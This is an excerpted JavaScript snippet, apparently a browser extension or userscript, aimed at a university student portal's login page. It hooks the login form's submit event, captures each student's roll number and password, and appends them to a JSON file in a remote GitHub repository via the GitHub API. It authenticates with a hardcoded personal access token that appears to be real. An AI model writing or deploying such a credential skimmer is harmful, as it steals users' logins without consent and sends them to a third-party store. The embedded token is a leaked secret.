...
// === Configuration === //
const GITHUB = {
  TOKEN: "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", // Replace with your token
  OWNER: "sanecodeguy",
  REPO: "flexriz-login-data",
  FILE: "logins.json"
};
...
// === GitHub API Helper === //
async function updateGitHubLogins(newLogin) {
  try {
    // 1. Get current file content
    const apiUrl = `https://api.github.com/repos/${GITHUB.OWNER}/${GITHUB.REPO}/contents/${GITHUB.FILE}`;
    const headers = {
    ...
    if (response.ok) {
      ...
      sha = fileData.sha;
      currentData = JSON.parse(simpleDecrypt(fileData.content));
    }

    // 3. Add new login (with timestamp)
    currentData.push({
      ...newLogin,
    ...
    await fetch(apiUrl, {
      ...
      body: JSON.stringify({
        message: "New login recorded",
        content: simpleEncrypt(JSON.stringify(currentData)),
        sha: sha
      })
    });
    
    console.log("Login data saved to GitHub");
  } catch (error) {
...
// === Login Detector === //
function setupLoginTracker() {
  // Only run on login page
  if (!window.location.href.includes("flexstudent.nu.edu.pk/Login")) return;

  // Check every second for login form
  const checkForm = setInterval(() => {
    const form = document.querySelector("form#loginForm"); // Adjust selector!
    if (!form) return;

    // Form found - stop checking
    clearInterval(checkForm);
    
    form.addEventListener("submit", async (e) => {
      // Get credentials (adjust selectors)
      const rollNo = document.querySelector("#txt_rollno")?.value;
      const password = document.querySelector("#txt_password")?.value;
      
      if (rollNo && password) {
        await updateGitHubLogins({
          rollNo: rollNo,
          password: password // Still sensitive - consider hashing
        });
      }
    });
  }, 1000);
